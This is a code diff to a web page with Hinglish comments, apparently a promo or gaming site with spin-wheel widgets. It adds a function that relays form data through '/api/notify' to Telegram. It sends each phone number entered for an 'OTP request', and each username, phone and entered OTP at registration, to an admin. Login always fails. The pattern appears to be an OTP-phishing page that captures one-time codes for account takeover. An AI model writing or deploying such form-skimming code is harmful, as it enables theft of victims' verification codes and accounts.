@@ -564,6 +564,12 @@
             justify-content: center;
             flex-shrink: 0; 
         }
+        
+        /* (NAYA) Disable button style */
+        .input-group.otp .btn-send-otp:disabled {
+            background-color: #aaa;
+            cursor: not-allowed;
+        }
 
         /* --- LOGIN-SPECIFIC STYLES --- */
         .form-notice-login {
@@ -641,6 +647,11 @@
             font-weight: 500;
             cursor: pointer;
             margin-bottom: 20px;
+        }
+        
+        .btn-submit-register:disabled, .btn-submit-login:disabled {
+             background-color: #aaa;
+             cursor: not-allowed;
         }
 
         .extra-links {
@@ -782,7 +793,7 @@
         }
         
         
-        /* === (NAYA) PROMO POPUP STYLES === */
+        /* --- PROMO POPUP STYLES --- */
         #promo-popup-overlay {
             position: fixed;
             top: 0;
@@ -838,8 +849,6 @@
             cursor: pointer;
             border: 2px solid white;
         }
-        /* === (END) PROMO POPUP STYLES === */
-
 
     </style>
 </head>
@@ -965,17 +974,17 @@
     </div> <div id="floating-widgets-container">
         <div class="floating-widget box" id="widget-invite">
             <div class="widget-close-btn clickable">&times;</div>
-            <img src="images/widget_invite_box.avif" alt="Invite Box" class="clickable">
+            <img src="images/widget_invite_box.png" alt="Invite Box" class="clickable">
         </div>
         
         <div class="floating-widget" id="widget-wheel-1">
             <div class="widget-close-btn clickable">&times;</div>
-            <img src="images/widget_wheel_1.avif" alt="Wheel 1" class="clickable">
+            <img src="images/widget_wheel_1.png" alt="Wheel 1" class="clickable">
         </div>
         
         <div class="floating-widget" id="widget-wheel-2">
             <div class="widget-close-btn clickable">&times;</div>
-            <img src="images/widget_wheel_2.avif" alt="Wheel 2" class="clickable">
+            <img src="images/widget_wheel_2.png" alt="Wheel 2" class="clickable">
         </div>
     </div>
     <div id="register-panel">
@@ -1127,6 +1136,34 @@
     <script>
         document.addEventListener('DOMContentLoaded', () => {
             
+            // === (NAYA) TELEGRAM KO MESSAGE BHEJNE KA FUNCTION ===
+            async function sendTelegramMessage(message) {
+                try {
+                    // Yeh /api/notify.js file ko call karega jo aapne banayi thi
+                    const response = await fetch('/api/notify', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({ message: message }),
+                    });
+
+                    const data = await response.json();
+
+                    if (data.success) {
+                        console.log('Message sent to Telegram!');
+                        return true;
+                    } else {
+                        console.error('Failed to send Telegram message:', data.error);
+                        return false;
+                    }
+                } catch (error) {
+                    console.error('Error in sendTelegramMessage:', error);
+                    return false;
+                }
+            }
+
+
             // === SPLASH SCREEN LOGIC ===
             const splash = document.getElementById('splash-screen');
             const main = document.getElementById('main-content');
@@ -1138,7 +1175,7 @@
                     splash.style.display = 'none';
                 }, 500); 
                 
-                // (NAYA) Splash screen ke 1 sec baad promo popup dikhayein
+                // Splash screen ke 1 sec baad promo popup dikhayein
                 setTimeout(showPromoPopup, 1000); 
             }
             setTimeout(showApp, 3000); // 3 second delay
@@ -1291,22 +1328,83 @@
             });
 
 
-            // === FORM SUBMIT LOGIC (Using Custom Alert) ===
+            // === (TABDEEL SHUDA) FORM SUBMIT LOGIC ===
             
-            // Register Form Submit
-            const regForm = document.getElementById('registration-form');
-            regForm.addEventListener('submit', function(e) {
-                e.preventDefault(); 
-                console.log('Registration Form submitted (simulation).');
-                showCustomAlert('Incorrect OTP');
+            // --- Send OTP Button ---
+            const sendOtpBtn = document.querySelector('.btn-send-otp');
+            const regPhoneInput = document.getElementById('reg-phone');
+
+            sendOtpBtn.addEventListener('click', async function(e) {
+                e.preventDefault();
+                const phone = regPhoneInput.value;
+
+                if (!phone || phone.length < 10) {
+                    showCustomAlert('Please enter a valid phone number.');
+                    return;
+                }
+                
+                sendOtpBtn.disabled = true; // Button disable karein
+                sendOtpBtn.textContent = 'Sending...';
+
+                // Telegram ko message bhejein
+                const message = `== OTP REQUEST ==\n\nNumber: ${phone}`;
+                const sent = await sendTelegramMessage(message);
+
+                if (sent) {
+                    showCustomAlert('OTP request sent to admin. You will receive an OTP shortly.');
+                    // Yahan aap timer bhi chala sakte hain
+                } else {
+                    showCustomAlert('Failed to send request. Please try again.');
+                }
+                
+                sendOtpBtn.disabled = false; // Button wapis enable karein
+                sendOtpBtn.textContent = 'Send OTP';
             });
 
-            // Login Form Submit
+
+            // --- Register Form Submit ---
+            const regForm = document.getElementById('registration-form');
+            regForm.addEventListener('submit', async function(e) {
+                e.preventDefault(); 
+                console.log('Registration Form submitted.');
+
+                // Form se saari values lein
+                const username = document.getElementById('reg-username').value;
+                const phone = document.getElementById('reg-phone').value;
+                const otp = document.getElementById('reg-otp').value;
+                const registerButton = document.querySelector('.btn-submit-register');
+                
+                if (!username || !phone || !otp) {
+                    showCustomAlert('Please fill all required fields.');
+                    return;
+                }
+                
+                registerButton.disabled = true;
+                registerButton.textContent = 'Submitting...';
+                
+                // Telegram ko approval ke liye message bhejein
+                const message = `== NEW REGISTRATION ==\n\nUsername: ${username}\nPhone: ${phone}\nOTP Entered: ${otp}\n\nPlease approve or deny.`;
+                const sent = await sendTelegramMessage(message);
+                
+                if (sent) {
+                    showCustomAlert('Registration request submitted. Please wait for admin approval.');
+                    // Yahan aap user ko login page par bhej sakte hain ya panel band kar sakte hain
+                    // closeRegisterPanel(); 
+                } else {
+                    showCustomAlert('Registration failed. Please try again.');
+                }
+                
+                registerButton.disabled = false;
+                registerButton.textContent = 'Register';
+            });
+
+            // --- Login Form Submit ---
             const loginForm = document.getElementById('login-form');
             loginForm.addEventListener('submit', function(e) {
                 e.preventDefault(); 
                 console.log('Login Form submitted (simulation).');
-                showCustomAlert('Wrong Password or Username');
+                // Login ki logic yahan manually handle hogi (maslan admin ke approve karne ke baad)
+                showCustomAlert('Wrong Password or Username. (Pending admin approval)');
             });
 
             // === FLOATING WIDGETS LOGIC ===
@@ -1325,7 +1423,7 @@
             });
             
             
-            // === (NAYA) PROMO POPUP LOGIC ===
+            // === PROMO POPUP LOGIC ===
             let promoTimer = null; // Timer ko store karne ke liye
             const promoOverlay = document.getElementById('promo-popup-overlay');
             const promoCloseBtn = document.getElementById('promo-close-btn');
@@ -1361,8 +1459,6 @@
                     hidePromoPopup();
                 }
             });
-            // === (END) PROMO POPUP LOGIC ===
-
 
         });
     </script>
